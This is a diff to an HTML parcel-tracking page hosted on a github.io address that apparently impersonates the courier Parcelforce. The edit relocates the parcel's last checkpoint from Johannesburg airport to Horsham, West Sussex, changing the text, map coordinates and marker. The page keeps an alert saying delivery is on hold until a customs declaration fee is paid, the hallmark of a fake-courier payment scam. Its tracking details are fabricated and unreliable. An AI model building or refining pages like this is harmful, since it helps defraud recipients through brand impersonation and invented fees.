@@ -1,6 +1,3 @@
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -73,7 +70,7 @@
     <h3>Parcel journey</h3>
     <div class="progress-container">
       <div class="progress-step" id="step1">Picked Up (UK — 04/11/2025)</div>
-      <div class="progress-step" id="step2">Arrived in South Africa — 24/11/2025</div>
+      <div class="progress-step" id="step2">Arrived in England — 24/11/2025</div>
       <div class="progress-step" id="step3">Delivered (Expected 25/11/2025)</div>
     </div>
 
@@ -94,7 +91,7 @@
 
     <h3>Status updates</h3>
     <ul class="status-list">
-      <li><strong>Last Checkpoint:</strong> Johannesburg OR Tambo Airport — Arrived 24/11/2025</li>
+      <li><strong>Last Checkpoint:</strong> Horsham, West Sussex — Arrived 24/11/2025</li>
     </ul>
 
     <div class="alert">⚠ Parcel is on hold. Commercial Invoice/Customs Declaration must be paid before delivery can be completed to your home address.</div>
@@ -136,12 +133,12 @@
       }
       document.getElementById('progressFill').style.width = width + '%';
 
-      // Initialize Leaflet map (Johannesburg OR Tambo)
-      const map = L.map('map').setView([-26.1392, 28.2460], 10);
+      // Initialize Leaflet map (Horsham, England)
+      const map = L.map('map').setView([51.0629, -0.3270], 12); // Horsham coords
       L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '&copy; OpenStreetMap contributors'
       }).addTo(map);
-      L.marker([-26.1392, 28.2460]).addTo(map);
+      L.marker([51.0629, -0.3270]).addTo(map).bindPopup("Horsham, West Sussex — Arrived 24/11/2025");
 
       // QR code render
       const url = `https://parcel-force.github.io/parcelforce-site/PF557690344CN/`;
